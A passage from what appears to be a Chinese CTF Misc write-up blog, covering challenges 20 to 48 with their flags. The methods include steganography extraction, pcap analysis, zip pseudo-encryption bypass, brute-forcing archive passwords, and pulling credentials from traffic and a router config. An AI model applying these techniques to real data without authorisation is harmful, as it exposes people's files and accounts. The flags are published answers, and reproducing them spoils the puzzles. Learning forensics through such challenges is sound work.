爱因斯坦</h1><p>解法和17题基本一致，唯一的区别在于，zip文件的密码在属性中找到。<br><code>flag&#123;dd22a92bf2cceb6c0cd0d6b83ff51606&#125;</code></p><h1 id="20-easycap"><a href="#20-easycap" class="headerlink" title="20 - easycap"></a>20 - easycap</h1><p>打开下载的文件，是一个pcap文件<br>使用wireshark打开，发现全是TCP包，那么直接追踪流量，使用 <code>Anaylze -&gt; Follow TCP Stream</code><br>直接得到flag<br><code>FLAG:385b87afc8671dee07550290d16a8071</code><br>更改为标准格式：<br><code>flag&#123;385b87afc8671dee07550290d16a8071&#125;</code></p><h1 id="21-隐藏的钥匙"><a href="#21-隐藏的钥匙" class="headerlink" title="21 - 隐藏的钥匙"></a>21 - 隐藏的钥匙</h1><p>打开下载的文件，是一个jpg<br>直接使用010editor，搜索flag，得到：<br><code>flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</code><br>base64解密：<br><code>377cbadda1eca2f2f73d36277781f00a</code><br>整理为flag格式：<br><code>flag&#123;377cbadda1eca2f2f73d36277781f00a&#125;</code></p><h1 id="22-另外一个世界"><a href="#22-另外一个世界" class="headerlink" title="22 - 另外一个世界"></a>22 - 另外一个世界</h1><p>打开下载的文件，是一个jpg<br>直接使用010editor，搜索flag，没有找到<br>然后翻到最底部，发现有一串二进制，将二进制转换为字符串： <code>koekj3s</code><br>整理为flag格式：<br><code>flag&#123;koekj3s&#125;</code></p><h1 id="23-FLAG"><a href="#23-FLAG" class="headerlink" title="23 - FLAG"></a>23 - FLAG</h1><p>打开下载的文件，是一个png<br>使用pngcheck工具：<br><code>pngcheck.win64.exe -v 42.png</code><br>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">File: 42.png (383781 bytes)</span><br><span class="line">  chunk IHDR at offset 0x0000c, length 13</span><br><span class="line">    664 x 586 image, 24-bit RGB, non-interlaced</span><br><span class="line">  chunk IDAT at offset 0x00025, length 65536</span><br><span class="line">    zlib: deflated, 32K window, default compression</span><br><span class="line">  chunk IDAT at offset 0x10031, length 65536</span><br><span class="line">  chunk IDAT at offset 0x2003d, length 65536</span><br><span class="line">  chunk IDAT at offset 0x30049, length 65536</span><br><span class="line">  chunk IDAT at offset 0x40055, length 65536</span><br><span class="line">  chunk IDAT at offset 0x50061, length 55984</span><br><span class="line">  chunk IEND at offset 0x5db1d, length 0</span><br><span class="line">No errors detected in 42.png (8 chunks, 67.1% compression).</span><br></pre></td></tr></table></figure><p>那么发现含有zlib<br>使用Stegsolve工具，将Red，Green，Blue调为0，选择Save Bin，保存为zip文件<br>尝试打开zip文件时发现文件损坏，随便找个文件修复工具进行修复。<br>得到修复后的zip，然后解压，得到1文件<br>使用010Editor工具打开，然后搜索hctf，得到flag：<br><code>flag&#123;dd0gf4c3tok3yb0ard4g41n~~~&#125;</code></p><h1 id="24-神秘龙卷风"><a href="#24-神秘龙卷风" class="headerlink" title="24 - 神秘龙卷风"></a>24 - 神秘龙卷风</h1><p>打开压缩文件，得到rar<br>4位数字使用ARCHPR爆破得到密码5463<br>解压出来得到txt文件，代码看不懂。<br>查了下是brainfuck代码，使用 <a href="https://bf.doleczek.pl/">这个网站</a> 将代码填入并运行，得到flag：<br><code>flag&#123;e4bbef8bdf9743f8bf5b727a9f6332a8&#125;</code></p><h1 id="25-数据包中的线索"><a href="#25-数据包中的线索" class="headerlink" title="25 - 数据包中的线索"></a>25 - 数据包中的线索</h1><p>打开压缩文件，得到pcapng，是wireshark文件。<br>通过wireshark打开pcapng文件，找到HTTP包，通过Follow HTTP Stream得到一个base64编码的数据。<br>将base64编码的数据保存为txt文件，然后使用<a href="https://www.base64decode.org/">在线网站</a>解码txt文件，可以直接得到一张图片，图片上就写了flag<br><code>flag&#123;209acebf6324a09671abc31c869de72c&#125;</code></p><h1 id="26-假如给我三天光明"><a href="#26-假如给我三天光明" class="headerlink" title="26 - 假如给我三天光明"></a>26 - 假如给我三天光明</h1><p>打开压缩文件，得到一个jpg和一个zip，zip有加密，里面是一个wav文件。<br>首先来看jpg，通过查看jpg，发现封面上的盲文。<br>那么搜索英文盲文对照表，可知封面的为盲文对应为英文字符应当为：<br><code>kmdonowg</code><br>猜测是zip的密码，尝试成功<br>打开wav音频文件，是莫斯电码(分析方法：自己听，也可用Audacity工具分析)：<br><code>-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..</code><br>得到的英文是：<br><code>CTFWPEI08732?23DZ</code><br>整理后为：<br><code>flag&#123;wpei08732?23dz&#125;</code></p><h1 id="27-后门查杀"><a href="#27-后门查杀" class="headerlink" title="27 - 后门查杀"></a>27 - 后门查杀</h1><p>打开压缩文件，得到一个html文件夹<br>根据题目描述，是一个网站的文件，需要找到后门文件的密码。<br>直接用杀毒软件(我用的火绒)对html文件夹进行查杀，得到密码<br><code>flag&#123;6ac45fb83b3bc355c024f5034b947dd3&#125;</code></p><h1 id="28-webshell后门"><a href="#28-webshell后门" class="headerlink" title="28 - webshell后门"></a>28 - webshell后门</h1><p>方法和27题相同</p><h1 id="29-来首歌吧"><a href="#29-来首歌吧" class="headerlink" title="29 - 来首歌吧"></a>29 - 来首歌吧</h1><p>打开压缩文件，得到一个wav<br>音频文件属性无信息，但是在听歌的过程中，发现了摩尔斯电码。<br>于是打开Audacity工具分析：<br>发现有两段音频，是混合在一起的。<br>那么分析那一段明显是莫尔斯电码的音频可以得到：<br><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-.</code></p><p>解码整理得到：<br><code>flag&#123;5BC925649CB0188F52E617D70929191C&#125;</code></p><h1 id="30-荷兰宽带数据泄露"><a href="#30-荷兰宽带数据泄露" class="headerlink" title="30 - 荷兰宽带数据泄露"></a>30 - 荷兰宽带数据泄露</h1><p>打开压缩文件，得到一个conf.bin<br>搜索了一下，发现是一个路由器配置文件。<br>使用普通文件打开器显示乱码，于是下了一个路由器配置文件查看工具RouterPassView<br>使用该工具打开conf.bin，发现了配置信息。<br>然后通过配置信息找到了username和password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Username val=053700357621 /&gt;</span><br><span class="line">&lt;Password val=210265 /&gt;</span><br></pre></td></tr></table></figure><p>提交发现flag是username：<br><code>flag&#123;053700357621&#125;</code></p><h1 id="31-面具下的flag"><a href="#31-面具下的flag" class="headerlink" title="31 - 面具下的flag"></a>31 - 面具下的flag</h1><p>打开压缩文件，得到一个jpg<br>通过查看发现jpg中有一个vmdk文件，于是使用binwalk和foremost分离文件，得到了一个zip<br>zip文件显示需要输入密码，在没有得到密码提示信息时首先思考是否是伪加密。<br>于是打开010Editor工具搜索 <code>50 4B 01 02</code> ，后面的全局方式位标记 显示为 <code>09 00</code><br>将其修改为 <code>00 00</code> 再尝试解压，成功。<br>得到了一个vmdk文件，搜索得知vmdk文件是虚拟机文件。<br>Linux下使用7z命令解压：<br><code>7z x flag.vmdk -o./</code></p><p>得到了key_part_one和key_part_two目录<br>进入目录使用cat命令读取文件，分别得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- --.&lt;+ +++[- &gt;----</span><br><span class="line">&lt;]&gt;-- ----- .&lt;+++ [-&gt;++ +&lt;]&gt;+ +++++ .&lt;+++ +[-&gt;- ---&lt;] &gt;-.&lt;+ +++++ [-&gt;++</span><br><span class="line">++++&lt; ]&gt;+++ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;---- -.+++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br></pre></td></tr></table></figure><p>前者使用 <a href="https://bf.doleczek.pl/">BrainFuck</a> 可得到flag的前半部分：<br><code>flag&#123;N7F5_AD5</code><br>后者使用 <a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook!</a> 可得到flag的后半部分：<br><code>_i5_funny!&#125;</code></p><p>最终整理得到flag:<br><code>flag&#123;N7F5_AD5_i5_funny!&#125;</code></p><h1 id="32-九连环"><a href="#32-九连环" class="headerlink" title="32 - 九连环"></a>32 - 九连环</h1><p>打开压缩文件，得到一个jpg<br>通过010editor工具发现有zip<br>于是使用binwalk和foremost分离文件，得到一个zip<br>得到zip后发现有密码，爆破未果，猜测是伪密码。<br>定位到 <code>50 4B 01 02</code> 后4个字节的位置，有多个 <code>50 4B 01 02</code> ，逐个尝试。<br>最终在第3个修改后成功解压文件。<br>解压出来是一个jpg和一个zip，zip里有flag的文件，需要密码。猜测密码与图片有关。<br>通过上面其它已知办法没法找到密码。于是在网上搜索，了解到一个steghide工具。可以找出图片中的隐写文件。<br>在kali下使用该工具，安装命令为：<br><code>apt-get install steghide</code><br>安装好后，使用命令找出该jpg图片的隐写文件：<br><code>steghide extract -sf good.jpg</code><br>提示需要密码，直接空密码回车<br>得到一个ko.txt文件，打开看得到密码。<br>拿到zip解压，得到flag.txt<br>打开flag文件得到flag：<br><code>flag&#123;1RTo8w@&amp;4nK@z*XL&#125;</code></p><h1 id="33-被劫持的神秘礼物"><a href="#33-被劫持的神秘礼物" class="headerlink" title="33 - 被劫持的神秘礼物"></a>33 - 被劫持的神秘礼物</h1><p>打开百度网盘，得到一个pcapng文件<br>根据题目描述需要找到用户名和密码，那么一般url里有login字段，并且是post方式提交。<br>顺利找到了HTTP包后，翻找字段，得到了用户名和密码，进行md532位小写加密，即可得到答案。</p><h1 id="34-BJDCTF2020-认真你就输了"><a href="#34-BJDCTF2020-认真你就输了" class="headerlink" title="34 - [BJDCTF2020]认真你就输了"></a>34 - [BJDCTF2020]认真你就输了</h1><p>打开rar压缩包，是一个10文件夹，然后里面是一个xls格式的文件。<br>尝试打开，发现显示格式与扩展名不匹配，强制打开是一堆乱码。然后查找互联网，按照网上所说的方式修改注册表。<br>修改注册表后打开，仍然是一堆乱码。<br>通过“格式与扩展名不匹配”和乱码中出现的flag.txt字段，感觉该文件原本不是xls文件。<br>于是修改了扩展名为zip<br>解压后找到flag.txt<br>打开即可得到flag：<br><code>flag&#123;M9eVfi2Pcs#&#125;</code></p><h1 id="35-BJDCTF2020-藏藏藏"><a href="#35-BJDCTF2020-藏藏藏" class="headerlink" title="35 - [BJDCTF2020]藏藏藏"></a>35 - [BJDCTF2020]藏藏藏</h1><p>打开rar压缩包，是一个jpg图片，猜测其中混杂了其它文件，使用binwalk和foremost进行了文件分离。<br>分离出了一个zip，然后解压打开，发现一个二维码。使用QR_Research<br>得到flag：<br><code>flag&#123;you are the best!&#125;</code></p><h1 id="36-被偷走的文件"><a href="#36-被偷走的文件" class="headerlink" title="36 - 被偷走的文件"></a>36 - 被偷走的文件</h1><p>打开zip压缩包，是一个pcapng文件<br>然后使用wireshark打开，进行流量分析，发现ftp协议传输有一个RAR文件。<br>于是使用binwalk和foremost分离文件，得到一个rar文件<br>文件有密码，使用4位纯数字爆破，成功得到flag.txt<br><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p><h1 id="37-刷新过的图片"><a href="#37-刷新过的图片" class="headerlink" title="37 - 刷新过的图片"></a>37 - 刷新过的图片</h1><p>这道题花了2个小时，原因是涉及到新知识，最主要的是出了意料之外的岔子。<br>容我细细讲来。<br>首先题目提示的刷新，那么首先想到的是F5，但是通过F5怎么也没得到flag。<br>于是查了下资料，了解到原来有名为F5隐写的知识。涉及到F5隐写需要使用F5-steganography工具。<br>本来在物理机上git clone了一下，以为很容易解决了。但是却出现了报错。<br>我并不想研究错误的原因，于是在kali上尝试，竟然也出现了同样的报错。<br>这下我不得不研究原因了，搜索了一下发现，原来是这个F5-steganography工具使用了一个名为sun的方法，而这个方法正好在jdk16及以上的版本中不支持了。看了下物理机的jdk版本16，kali的jdk版本17。<br>无奈之下，换了另一台虚拟机Ubuntu，发现它的jdk版本是11，这下我大喜过望，正当以为能解决的时候。<br>发现ssh又连不上，这次的原因并非是ssh未启动，而是22端口未开放。本来我也想到是这个原因，但问题在于我忘记了Ubuntu的防火墙命令，只记得一个另外的firewalld和iptables。最后在网上查了下资料发现命令是ufw。<br>于是我把22端口开放。然后ssh成功连接。<br>正当我以为万事大吉，结果发现无法上传文件。试了好几次都不行，于是采用了网上的方式，使用rz命令。<br>安装rz需要root权限，但是我却发现密码不对。root密码居然和开机密码不同，于是我只好改了密码。<br>然后终于能在xshell里使用rz命令，上传了Misc.jpg图片，安装F5-steganography工具。解决了另外一些小问题。使用了命令：<br><code>java Extract Misc.jpg</code><br>得到了output.txt<br>将其下载到物理机，打开看到PK字段，推测是zip文件，将文件扩展名改为zip，需要密码，打开010editor查看是伪加密。<br>最终拿到了flag.txt<br><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p><h1 id="38-GXYCTF2019-佛系青年"><a href="#38-GXYCTF2019-佛系青年" class="headerlink" title="38 - [GXYCTF2019]佛系青年"></a>38 - [GXYCTF2019]佛系青年</h1><p>zip文件是伪加密，直接修改即可。<br>然后拿到fo.txt，打开以看是与佛论禅的加密。<br>于是直接搜索在线加解密的与佛论禅。<br>直接得到flag<br><code>flag&#123;w0_fo_ci_Be1&#125;</code></p><h1 id="39-BJDCTF2020-你猜我是个啥"><a href="#39-BJDCTF2020-你猜我是个啥" class="headerlink" title="39 - [BJDCTF2020]你猜我是个啥"></a>39 - [BJDCTF2020]你猜我是个啥</h1><p>将文件下载，是一个zip，但实际不是zip文件，打开010editor，发现是一个png文件，改为png之后，是一个二维码。<br>使用QR_Research工具发现flag不在。再次打开010editor，发现文件底部有flag<br><code>flag&#123;i_am_fl@g&#125;</code></p><h1 id="40-snake"><a href="#40-snake" class="headerlink" title="40 - snake"></a>40 - snake</h1><p>打开压缩文件，得到一个jpg，通过010editor查看，得知jpg中混杂了其它文件。<br>使用binwalk和foremost分离文件，得到zip<br>解压zip，得到cipher和key两个文件。<br>先打开key这个文件，是一个base64编码，解码得到：<br><code>What is Nicki Minaj&#39;s favorite song that refers to snakes?</code><br>网上搜了下，得到密钥为anaconda(必须全小写)<br>然后，由于snake的另一个同义词是serpent<br>serpent是一种加密方式。<br>于是找到这个加解密网站：<a href="http://serpent.online-domain-tools.com/">Serpent – Symmetric Ciphers Online</a><br>将文件上传，使用密钥，模式为ECB<br>最终得到flag，整理得：<br><code>flag&#123;who_knew_serpent_cipher_existed&#125;</code></p><p>这种题还是挺难的，难在需要联想到蛇的另一个单词是一种加解密的方式。不过也更符合真实场景。</p><h1 id="41-秘密文件"><a href="#41-秘密文件" class="headerlink" title="41 - 秘密文件"></a>41 - 秘密文件</h1><p>本题解法和第36题一模一样。不过多赘述。</p><h1 id="42-BJDCTF2020-just-a-rar"><a href="#42-BJDCTF2020-just-a-rar" class="headerlink" title="42 - [BJDCTF2020]just_a_rar"></a>42 - [BJDCTF2020]just_a_rar</h1><p>打开rar文件，还是一个rar，提示4位数，直接使用ARCHPR工具爆破4位纯数字，得到密码2016<br>密码得到后解压得到flag.jpg<br>打开010editor粗略看了一眼，以为是文件分离，但是实际操作发现不是。<br>再仔细看了下，原来flag藏在了16进制的中间，即可得：<br><code>flag&#123;Wadf_123&#125;</code></p><h1 id="43-BJDCTF2020-鸡你太美"><a href="#43-BJDCTF2020-鸡你太美" class="headerlink" title="43 - [BJDCTF2020]鸡你太美"></a>43 - [BJDCTF2020]鸡你太美</h1><p>打开rar文件，得到两个gif，其中一个能打开，一个不能，不能打开得gif通过010editor查看，发现缺少了gif文件头，添加上文件头后，即可出现flag<br><code>flag&#123;zhi_yin_you_are_beautiful&#125;</code></p><h1 id="44-菜刀666"><a href="#44-菜刀666" class="headerlink" title="44 - 菜刀666"></a>44 - 菜刀666</h1><p>打开rar文件，得到一个pcapng文件<br>使用wireshark工具打开，分析流量，找到一个最大的HTTP数据包，然后follow HTTP Stream<br>发现了其中含有大量16进制数据，查看开头结尾，发现是一个jpg格式文件。<br>拿到在线网站转文件，得到一个jpg<br>找到了密码（一开始我把密码当成是flag了，尴尬）：<br><code>Th1s_1s_p4sswd_!!!</code></p><p>然后发现pcapng里有一个zip文件，拿去foremost分离<br>得到一个zip，需要密码，就是之前发现的那个。解压后拿到flag：<br><code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code></p><h1 id="45-BJDCTF2020-一叶障目"><a href="#45-BJDCTF2020-一叶障目" class="headerlink" title="45 - [BJDCTF2020]一叶障目"></a>45 - [BJDCTF2020]一叶障目</h1><p>使用010editor打开，修改了一下宽高，发现图片有变化，说明需要改为原来的宽高。<br>使用网上找的CRC修复脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">file = <span class="string">&#x27;1.png&#x27;</span>  <span class="comment">#注意，1.png图片要和脚本在同一个文件夹下哦~</span></span><br><span class="line">fr = <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = <span class="built_in">bytearray</span>(fr[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">crc32key = <span class="built_in">eval</span>(<span class="built_in">str</span>(fr[<span class="number">29</span>:<span class="number">33</span>]).replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&#x27;0x&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#crc32key = 0xCBD6DF8A #补上0x，copy hex value</span></span><br><span class="line"><span class="comment">#data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)  #hex下copy grep hex</span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            <span class="built_in">print</span>(width,height)</span><br><span class="line">            <span class="comment">#写文件</span></span><br><span class="line">            newpic = <span class="built_in">bytearray</span>(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = <span class="built_in">open</span>(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="comment">#保存副本</span></span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br></pre></td></tr></table></figure><p>将脚本与图片置于同一文件夹下，即可得到原来的图片，拿到flag：<br><code>flag&#123;66666&#125;</code></p><h1 id="46-SWPU2019-神奇的二维码"><a href="#46-SWPU2019-神奇的二维码" class="headerlink" title="46 - [SWPU2019]神奇的二维码"></a>46 - [SWPU2019]神奇的二维码</h1><p>打开压缩文件，是一个二维码，首先用QR Research工具扫描二维码，发现flag不在。<br>然后拿去分离，foremost分离不了，用binwalk分离，命令是：<br><code>binwalk -e BitcoinPay.png --run-as=root</code><br>得到几个rar，doc，jpg，txt文件。<br>分别打开，看到比较可疑的是18394.rar文件，设有密码，无法打开。查看文件头，确实是rar文件。但是无法爆破。<br>打开encode.txt，一个base64编码，解码后是一串无效数字。然后打开flag.doc的文件，里面是base64编码了很多次字符串。<br>使用python脚本对base64解码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">s</span>):</span><br><span class="line">    n=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = base64.b64decode(s)</span><br><span class="line">            n+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Base64共decode了&#123;0&#125;次，最终结果如下：&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(s,<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;base64.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    decode(f)</span><br></pre></td></tr></table></figure><p>解码得到真正的rar文件的密码，打开得到mp3文件。<br>mp3文件使用Audacity工具打开，发现是摩尔斯电码：<br><code>-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--</code></p><p>解密得到flag：<br><code>flag&#123;morseisveryveryeasy&#125;</code></p><h1 id="47-BJDCTF2020-纳尼"><a href="#47-BJDCTF2020-纳尼" class="headerlink" title="47 - [BJDCTF2020]纳尼"></a>47 - [BJDCTF2020]纳尼</h1><p>打开rar文件，发现是一个gif和txt。txt文件提示gif文件打不开<br>那么通过010Editor工具打开gif文件，发现缺少了文件头。<br>添加上文件头后能打开gif，显示了一个base64编码的字符串：<br><code>Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=</code><br>解码后得到flag：<br><code>flag&#123;wang_bao_qiang_is_sad&#125;</code></p><h1 id="48-梅花香之苦寒来"><a href="#48-梅花香之苦寒来" class="headerlink" title="48 - 梅花香之苦寒来"></a>48 - 